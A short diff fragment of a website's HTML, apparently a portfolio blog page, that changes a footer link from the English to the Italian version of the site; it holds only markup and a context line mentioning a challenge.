             <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                 xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                 <path
@@ -637,7 +637,7 @@ This challenge provided a python file like this</p>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="https://albovo.tech/en/">Portfolio</a></span> · 
+        <span>&copy; 2025 <a href="https://albovo.tech/it/">Portfolio</a></span> · 
 
     <span>
         Powered by
